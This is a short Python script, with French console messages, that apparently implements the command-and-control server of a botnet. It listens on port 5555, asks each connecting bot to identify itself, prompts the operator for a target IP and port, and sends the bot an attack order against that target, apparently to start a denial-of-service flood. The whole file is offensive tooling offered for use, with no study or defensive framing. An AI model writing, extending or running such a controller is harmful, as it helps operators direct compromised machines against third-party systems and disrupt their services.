import socket

def start_c2():
    host = '0.0.0.0' 
    port = 5555
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    
    print(f"[*] C2 en attente de connexions sur le port {port}...")
    
    while True:
        client, addr = server.accept()
        print(f"[*] Connexion établie avec {addr}")
        
        client.send("IDENTIFY".encode())
        data = client.recv(1024).decode()
        print(f"[+] Bot identifié : {data}")
        
        target = input("Entrez la cible (IP|PORT) pour lancer l'attaque (ex: 127.0.0.1|80) : ")
        
        client.send(f"ATTACK|{target}".encode())
        print(f"[*] Ordre d'attaque envoyé à {addr}")

        input("Appuyez sur Entrée pour arrêter la session avec ce bot...")
        client.close()

if __name__ == "__main__":
    start_c2()